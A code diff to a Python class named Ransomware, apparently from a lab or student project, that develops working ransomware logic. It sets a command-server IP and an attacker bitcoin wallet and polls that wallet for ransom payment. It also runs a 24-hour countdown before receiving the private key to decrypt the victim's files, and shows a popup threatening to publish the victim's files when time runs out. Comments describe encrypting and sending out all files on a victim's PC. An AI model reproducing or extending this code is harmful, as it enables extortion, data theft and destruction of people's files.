@@ -14,14 +14,14 @@ import re
 import tempfile
 
 class Ransomware: 
-    SERVER_IP = "10.0.2.15"
+    SERVER_IP = "10.0.2.5"
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
-    global bitcoin_needed, wallet_address
+    global bitcoin_needed, wallet_address, initial_balance
     bitcoin_needed = 1; #Instanttiate the amount of bitcoin needed
     wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
-
+    initial_balance = 0
 
     def __init__(self, host1, host2, number, directory):
         # Construct hostname of the remote server from the first two
@@ -105,23 +105,26 @@ class Ransomware:
 
         # Make API request to retrieve wallet balance
         response = requests.get(balance_url)
+        print(response.status_code)
         if response.status_code == 200:
             response_text = response.text
             index =  response_text.find("balance of")
             balance_str = response_text[index+11:index + 20]
             match = re.search(decimal_pattern, balance_str)
             balance = float(match.group())
-        return balance
+            return balance
+        return 1
 
 
-    def check_if_user_has_paid(self, initial_balance):
+    def check_if_user_has_paid(self, initial_bal):
         current_balance = self.get_balance(wallet_address)
-        change = current_balance - initial_balance
+        change = current_balance - initial_bal
         
-        if (change == 0):
-            print(bitcoin_needed)
+        print("balance changed by: " + str(change))
+        if (change == bitcoin_needed):
             return True
         else:
+            global initial_balance
             initial_balance = current_balance
             return False
         
@@ -199,7 +202,7 @@ class Ransomware:
 
     def calulate_bitcoin(self, size_of_files):
         global bitcoin_needed
-        bitcoin_needed = str((size_of_files/10000000000) * 0.0002)
+        bitcoin_needed = str((size_of_files/10000000))
 
     # Encrypt all the safe to encrypt files on a victims pc
     def encrypt_and_send_all_files(self, directory, key):
@@ -298,11 +301,12 @@ class Ransomware:
 
 
         start_time = time.time()
-        remaining_time = 70 #24 hours 
+        remaining_time = 86400 #24 hours 
 
 
-
-        while remaining_time > 0:
+        counter = 1
+        while (remaining_time > 0):
+            counter += 1
         # Format the remaining time as hours, minutes and seconds
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
@@ -317,57 +321,59 @@ class Ransomware:
 
             # Update the remaining time
             elapsed_time = time.time() - start_time
-            remaining_time = 70 - elapsed_time
+            remaining_time = 86400 - elapsed_time
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
-            initial_balance =  self.get_balance(wallet_address)
-
-            #User has paid before the time ran out
-            # self.check_if_user_has_paid()
-            if (self.check_if_user_has_paid(initial_balance)):
-                # Waits until all the files has been uploaded before processing the payment
-
-                time.sleep(5)
-
-                popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
             
-                """ Receiving the private key. """
-                filename = base64.b64decode(self._socket.recv(2048)).decode("utf-8")
-                filename = 'private_key.pem'
-                print(f"[RECV] Receiving the private key")
-                print("filename: " + filename)
 
-                key = open(filename, "wb")
-                self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
-    
-                """ Receiving the private key from the server. """
-                data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
-                print(data)
-                print(type(data))
-            
-                print(f"[RECV] Receiving the private key data.")
-                key.write(data)
-                self._socket.sendall(base64.b64encode("File Data recieved.".encode("utf-8")))
-            
-                """ Closing the file. """
-                key.close()
+            #Only check if they have paid every 1 mins
+            if (counter == 60):
+                counter = 1
 
-                #Read the private key from the server
-                #I am not sure where to put this above, so I will leave it here for now
-                with open("private_key.pem", "rb") as key_content:
-                    key = rsa.PrivateKey.load_pkcs1(key_content.read())
+                if (self.check_if_user_has_paid(initial_balance)):
+                    # Waits until all the files has been uploaded before processing the payment
 
-                self.decrypt_all_files(home, key)
+                    
 
-                self._socket.sendall(base64.b64encode("x".encode("utf-8")))
+                    popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
+                
+                    """ Receiving the private key. """
+                    filename = base64.b64decode(self._socket.recv(2048)).decode("utf-8")
+                    filename = 'private_key.pem'
+                    print(f"[RECV] Receiving the private key")
+                    print("filename: " + filename)
+
+                    key = open(filename, "wb")
+                    self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
+        
+                    """ Receiving the private key from the server. """
+                    data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
+                    print(data)
+                    print(type(data))
+                
+                    print(f"[RECV] Receiving the private key data.")
+                    key.write(data)
+                    self._socket.sendall(base64.b64encode("File Data recieved.".encode("utf-8")))
+                
+                    """ Closing the file. """
+                    key.close()
+
+                    #Read the private key from the server
+                    #I am not sure where to put this above, so I will leave it here for now
+                    with open("private_key.pem", "rb") as key_content:
+                        key = rsa.PrivateKey.load_pkcs1(key_content.read())
+
+                    self.decrypt_all_files(home, key)
+
+                    self._socket.sendall(base64.b64encode("x".encode("utf-8")))
 
 
-                break
-            
-                #TODO: Implement code to delete all the files that are stored on the server
+                    break
+                
+                    #TODO: Implement code to delete all the files that are stored on the server
 
-
+        subprocess.Popen(["zenity", "--info", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])
 
 #Main function/ control flow
 if __name__ == '__main__':
